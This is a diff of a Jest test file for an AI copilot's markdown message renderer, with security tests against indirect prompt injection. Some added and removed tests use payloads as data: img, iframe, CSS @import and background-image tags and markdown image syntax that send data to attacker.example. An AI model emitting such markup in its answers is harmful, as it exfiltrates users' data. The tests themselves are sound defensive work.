@@ -1,5 +1,5 @@
 import React from 'react'
-import { render, screen, waitFor } from 'uiSrc/utils/test-utils'
+import { render, screen } from 'uiSrc/utils/test-utils'
 
 import MarkdownMessage from './MarkdownMessage'
 
@@ -8,115 +8,113 @@ describe('MarkdownMessage', () => {
     expect(render(<MarkdownMessage>1</MarkdownMessage>)).toBeTruthy()
   })
 
-  it('should render plain markdown content', async () => {
+  it('should render plain markdown content', () => {
     render(<MarkdownMessage>Hello **world**</MarkdownMessage>)
 
-    await waitFor(() => {
-      expect(screen.getByText(/world/i)).toBeInTheDocument()
-    })
+    expect(screen.getByText(/world/i)).toBeInTheDocument()
+  })
+
+  it('should render a redis code fence via the chat code block', async () => {
+    render(<MarkdownMessage>{'```redis\nGET foo\n```'}</MarkdownMessage>)
+
+    // CodeButtonBlock resolves Monaco syntax highlighting asynchronously
+    // even for its initial render; await it so the microtask settles inside
+    // `act` instead of leaking past this test.
+    expect(
+      await screen.findByTestId('code-button-block-content'),
+    ).toHaveTextContent('GET foo')
+  })
+
+  it('should render a language-less code fence via the chat code block', async () => {
+    render(<MarkdownMessage>{'```\nGET foo\n```'}</MarkdownMessage>)
+
+    // Copilot passes allLangs to MarkdownRenderer so fences without a
+    // language still render as an interactive chat code block (copy/run)
+    // instead of a plain <pre>.
+    expect(
+      await screen.findByTestId('code-button-block-content'),
+    ).toHaveTextContent('GET foo')
+  })
+
+  it('should call onMessageRendered on mount when there is content', () => {
+    const onMessageRendered = jest.fn()
+
+    render(
+      <MarkdownMessage onMessageRendered={onMessageRendered}>
+        Hello
+      </MarkdownMessage>,
+    )
+
+    expect(onMessageRendered).toHaveBeenCalledTimes(1)
+  })
+
+  it('should not call onMessageRendered when content is empty', () => {
+    const onMessageRendered = jest.fn()
+
+    render(
+      <MarkdownMessage onMessageRendered={onMessageRendered}>
+        {''}
+      </MarkdownMessage>,
+    )
+
+    expect(onMessageRendered).not.toHaveBeenCalled()
+  })
+
+  it('should not re-fire onMessageRendered when only the callback reference changes', () => {
+    const first = jest.fn()
+    const { rerender } = render(
+      <MarkdownMessage onMessageRendered={first}>Hello</MarkdownMessage>,
+    )
+    expect(first).toHaveBeenCalledTimes(1)
+
+    const second = jest.fn()
+    rerender(
+      <MarkdownMessage onMessageRendered={second}>Hello</MarkdownMessage>,
+    )
+
+    // Same message content, only the callback identity changed: no re-fire.
+    expect(second).not.toHaveBeenCalled()
+    expect(first).toHaveBeenCalledTimes(1)
   })
 
   describe('security', () => {
     // RED-194228 / VDP-4596: message content can be influenced by untrusted
-    // data (indirect prompt injection), so tags able to trigger an outbound
-    // request must never render — otherwise they exfiltrate data on load.
-    it('should not render <img> tags from AI content', async () => {
+    // data (indirect prompt injection). MarkdownRenderer renders without
+    // rehype-raw, so raw HTML in the source shows as literal text instead of
+    // being parsed into live elements — nothing can execute or beacon out.
+    it('should render raw HTML as literal text, not as elements', () => {
+      render(<MarkdownMessage>{'<p>{alert(1)}</p>'}</MarkdownMessage>)
+
+      expect(
+        screen.getByText('<p>{alert(1)}</p>', { exact: false }),
+      ).toBeInTheDocument()
+      expect(document.querySelector('script')).toBeNull()
+    })
+
+    it('should not render <img> tags from AI content', () => {
       const { container } = render(
         <MarkdownMessage>
           {'A bike. <img src="https://attacker.example/?leak=secret">'}
         </MarkdownMessage>,
       )
 
-      await waitFor(() => {
-        expect(screen.getByText(/A bike\./)).toBeInTheDocument()
-      })
-
+      expect(screen.getByText(/A bike\./)).toBeInTheDocument()
       expect(container.querySelector('img')).toBeNull()
     })
 
-    it('should not render other passive network tags from AI content', async () => {
-      const { container } = render(
+    // Copilot content never contains images, and markdown image syntax
+    // (unlike raw HTML) reaches MarkdownRenderer's own `img` handler, which
+    // renders a live <img> by default — a crafted `![](https://attacker/?...)`
+    // would fire an outbound GET on load and exfiltrate data.
+    it('should not render an <img> for markdown image syntax', () => {
+      render(
         <MarkdownMessage>
-          {'Marker text. ' +
-            '<video src="https://attacker.example/v"></video>' +
-            '<object data="https://attacker.example/o"></object>' +
-            '<embed src="https://attacker.example/e">' +
-            '<iframe src="https://attacker.example/i"></iframe>'}
+          {'![leak](https://attacker.example/x.png)'}
         </MarkdownMessage>,
       )
 
-      // MarkdownMessage formats asynchronously, so wait for content to render
-      // before asserting absence — otherwise the checks pass trivially.
-      await waitFor(() => {
-        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
-      })
-
-      expect(container.querySelector('video')).toBeNull()
-      expect(container.querySelector('object')).toBeNull()
-      expect(container.querySelector('embed')).toBeNull()
-      expect(container.querySelector('iframe')).toBeNull()
-    })
-
-    it('should not render an inline style that could beacon out via CSS', async () => {
-      const { container } = render(
-        <MarkdownMessage>
-          {'Marker text. ' +
-            '<span style="background-image:url(https://attacker.example/?leak=1)">text</span>'}
-        </MarkdownMessage>,
-      )
-
-      await waitFor(() => {
-        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
-      })
-
-      // No rendered element may carry a `style` attribute (stripped, or the
-      // whole message falls back to escaped text) — either way nothing loads.
-      expect(container.querySelector('[style]')).toBeNull()
-    })
-
-    it('should not render a <style> element that could beacon out via CSS', async () => {
-      const { container } = render(
-        <MarkdownMessage>
-          {'Marker text. ' +
-            '<style>@import url(https://attacker.example/?leak=1);</style>'}
-        </MarkdownMessage>,
-      )
-
-      await waitFor(() => {
-        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
-      })
-
-      expect(container.querySelector('style')).toBeNull()
-    })
-
-    it('should not keep a background attribute that could beacon out via a URL', async () => {
-      const { container } = render(
-        <MarkdownMessage>
-          {'Marker text. ' +
-            '<table background="https://attacker.example/?leak=1"><tr><td>x</td></tr></table>'}
-        </MarkdownMessage>,
-      )
-
-      await waitFor(() => {
-        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
-      })
-
-      expect(container.querySelector('[background]')).toBeNull()
-    })
-
-    it('should not render a raw <link> element that could load external resources', async () => {
-      const { container } = render(
-        <MarkdownMessage>
-          {'Marker text. ' +
-            '<link rel="stylesheet" href="https://attacker.example/leak.css">'}
-        </MarkdownMessage>,
-      )
-
-      await waitFor(() => {
-        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
-      })
-
-      expect(container.querySelector('link')).toBeNull()
+      expect(document.querySelector('img')).toBeNull()
+      expect(screen.queryByRole('img')).toBeNull()
     })
   })
 })
